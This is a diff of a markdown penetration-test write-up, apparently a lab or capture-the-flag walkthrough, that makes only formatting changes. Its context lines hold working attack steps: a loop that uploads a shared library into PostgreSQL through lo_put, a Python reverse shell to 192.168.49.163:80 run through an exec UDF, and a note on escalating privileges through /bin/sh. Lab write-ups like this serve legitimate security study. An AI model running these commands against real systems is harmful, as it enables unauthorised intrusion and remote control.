@@ -40,7 +40,7 @@ Compile the shared library:
 
 Generate the `.psql` payload:
 
-```
+```text
 xxd -p udf64.so | tee udf.txt
 x=0
 while read line; do echo "select lo_put(PLACEHOLDER, $x, '\\\x$line');" >> u.psql; x=$((x+30)); done < udf.txt
@@ -70,9 +70,9 @@ Verify Python is installed: `select exec('which python');`
 
 ![](../../.gitbook/assets/ace8f49532204b00bbfdf6bcf49d9d09.png)
 
-**Note: the only port that works is port 80. **Since the web application would be communicating with the PostgreSQL service through port 80, port 80 is likely whitelisted.
+**Note: the only port that works is port 80.** Since the web application would be communicating with the PostgreSQL service through port 80, port 80 is likely whitelisted.
 
-```
+```text
 select exec('python -c ''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.163",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")''');
 ```
 
@@ -95,3 +95,4 @@ We can leverage this to run `/bin/sh` with elevated privileges.
 ![](../../.gitbook/assets/7d5d16d938ef42eba9a1676b91079876.png)
 
 ![](../../.gitbook/assets/84c7b92b17e04ffb8e525f5f81066c77.png)
+
